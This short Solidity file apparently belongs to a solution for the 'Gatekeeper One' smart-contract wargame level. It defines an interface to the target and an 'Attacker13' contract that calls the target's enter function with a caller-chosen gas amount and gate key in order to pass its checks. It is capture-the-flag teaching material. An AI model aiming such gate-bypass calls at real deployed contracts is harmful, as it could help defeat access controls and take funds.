// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract GatekeeperOne {
    function enter(bytes8 _gateKey) public virtual returns (bool);
}

contract Attacker13 {
    function attack(
        address targetAddr,
        bytes8 _gateKey,
        uint256 _gas
    ) external {
        GatekeeperOne(targetAddr).enter{gas: _gas}(_gateKey);
    }
}